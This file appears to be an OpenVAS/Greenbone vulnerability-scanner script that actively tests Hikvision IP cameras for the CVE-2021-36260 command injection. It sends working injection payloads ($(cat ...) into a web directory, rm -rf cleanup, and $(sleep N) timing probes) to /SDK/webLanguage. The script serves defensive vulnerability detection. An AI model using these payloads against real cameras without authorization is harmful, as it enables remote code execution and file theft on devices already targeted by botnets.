# SPDX-FileCopyrightText: 2022 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:hikvision:ip_camera_firmware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.148631");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2022-08-24 03:18:31 +0000 (Wed, 24 Aug 2022)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-10-15 17:12:00 +0000 (Fri, 15 Oct 2021)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");

  script_cve_id("CVE-2021-36260");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Hikvision IP Camera RCE Vulnerability (HSRC-202109-01) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2022 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_hikvision_ip_camera_http_detect.nasl");
  script_mandatory_keys("hikvision/ip_camera/http/detected");
  script_require_ports("Services/www", 8081);

  script_tag(name:"summary", value:"Multiple Hikvision IP camera devices are prone to a remote code
  execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP requests and checks the responses.");

  script_tag(name:"insight", value:"A command injection vulnerability in the web server of some
  Hikvision IP camera devices due to insufficient input validation.

  Notes: This flaw is / was known to be exploted by:

  - the Mirai-based Botnet 'Moobot' in 2021

  - Mission2025/APT41 or APT10 threat actors in 2022 according to some analysis linked in the
  references");

  script_tag(name:"impact", value:"An attacker can exploit the vulnerability to launch a command
  injection attack by sending some messages with malicious commands.");

  script_tag(name:"affected", value:"Multiple Hikvision IP camera devices. Please see the referenced
  vendor advisory on more info on the affected devices.");

  script_tag(name:"solution", value:"See the referenced vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/security-notification-command-injection-vulnerability-in-some-hikvision-products/");
  script_xref(name:"URL", value:"https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html");
  script_xref(name:"URL", value:"https://www.fortinet.com/blog/threat-research/mirai-based-botnet-moobot-targets-hikvision-vulnerability");
  script_xref(name:"URL", value:"https://www.cyfirma.com/hikvision-surveillance-cameras-vulnerabilities/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("list_array_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url1 = "/SDK/webLanguage";

headers = make_array("X-Requested-With", "XMLHttpRequest",
                     "Content-Type", "application/x-www-form-urlencoded");

files = traversal_files("linux");

vt_strings = get_vt_strings();
filename = vt_strings["default_rand"];
info = make_array();

foreach pattern (keys(files)) {
  payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /' + files[pattern] + '>webLib/' +
             filename + ')</language>';

  req1 = http_post_put_req(port: port, url: url1, data: payload, add_headers: headers, method: "PUT");
  res1 = http_keepalive_send_recv(port: port, data: req1);
  # nb: Some devices are responding with a "401 Unauthorized" on the PUT request. As the endpoint
  # seems to be protected by authentication and the PUT request isn't accepted we don't need to
  # continue in this case (also not for the blind injection below) and just jump out / exit.
  if (res1 && res1 =~ "^HTTP/1\.[01] 401")
    exit(0);

  url2 = "/" + filename;
  req2 = http_get_req(port: port, url: url2, add_headers: headers);
  res2 = http_keepalive_send_recv(port: port, data: req2);

  if (res2 =~ "^HTTP/1\.[01] 200" && egrep(pattern: pattern, string: res2)) {
    result = chomp(http_extract_body_from_response(data: res2));

    info['Req 1: HTTP "PUT" body'] = payload;
    info['Req 1: HTTP Method'] = "PUT";
    info["Req 1: URL"] = http_report_vuln_url(port: port, url: url1, url_only: TRUE);
    foreach header (keys(headers))
      info['Req 1: HTTP "' + header + '" Header'] = headers[header];
    info['Req 2: HTTP Method'] = "GET";
    info['Req 2: URL'] = http_report_vuln_url(port: port, url: url2, url_only: TRUE);

    report  = 'By doing the following subsequent HTTP requests:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to execute the command "cat /' + files[pattern] + '".\n\n';
    report += 'Note: The file "' + filename + '" was deleted again.\n\nResult:\n' + result;
    expert_info = 'Request 1:\n'+ req1 + '\n\nResponse 1:\n' + res1 + '\n\n';
    expert_info += 'Request 2:\n'+ req2 + 'Response 2:\n' + res2;

    security_message(port: port, data:report, expert_info:expert_info);

    # nb: Cleanup / remove the file again
    payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(rm -rf webLib/' + filename +
              '>webLib/' + filename + ')</language>';
    req = http_post_put_req(port: port, url: url1, data: payload, add_headers: headers, method: "PUT");
    http_keepalive_send_recv(port: port, data: req);
    req = http_get_req(port: port, url: url2, add_headers: headers);
    http_keepalive_send_recv(port: port, data: req);
    exit(0);
  }
}

# Some devices have accepted our PUT request above but the subsequent GET request didn't returned
# the requested data (404 Not Found response). For these devices we're trying a blind injection.

payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(echo test)</language>';
req = http_post_put_req(port: port, url: url1, data: payload, add_headers: headers, method: "PUT");
start = unixtime();
res = http_keepalive_send_recv(port: port, data: req);
stop = unixtime();

# nb: On tested devices this had thrown a HTTP/1.1 403 Forbidden but we're just checking
# for a valid HTTP status code just to be sure that we're also catching devices behaving
# differently...
if (!res || res !~ "^HTTP/1\.[01] [0-9]{3}")
  exit(0);

latency = stop - start;
count = 0;
i = 0;
info = make_array();
expert_info = ""; # nb: To make openvas-nasl-lint happy...

foreach sleep (make_list(3, 5, 7)) {
  ++i;
  payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(sleep ' + sleep + ")</language>";
  req = http_post_put_req(port: port, url: url1, data: payload, add_headers: headers, method: "PUT");

  start = unixtime();
  res = http_keepalive_send_recv(port: port, data: req);
  stop = unixtime();

  time = stop - start;
  if (time >= sleep && time <= (sleep + latency)) {
    count++;
    expert_info += 'Request ' + count + ':\n'+ req + '\n\nResponse ' + count + ':\n' + res + '\n';
    info["HTTP PUT body " + i] = payload;
    info["HTTP PUT body " + i + " response time"] = time;
  }
}

if (count >= 2) {
  info["Affected URL"] = http_report_vuln_url(port: port, url: url1, url_only: TRUE);
  info["HTTP Method"] = "PUT";
  info["Response latency (in seconds)"] = latency;
  foreach header (keys(headers))
    info['HTTP "' + header + '" Header'] = headers[header];

  report = 'It was possible to execute multiple "sleep" commands on the target system and verify the existence of the vulnerability by checking the response time.\n\n';
  report += text_format_table(array: info);

  security_message(port: port, data: report, expert_info: expert_info);
  exit(0);
}

# nb: No exit(99); because some devices:
# - might have some limited size for the payload
# - are responding with a "401 Unauthorized" on our first PUT request to "/SDK/webLanguage"
exit(0);
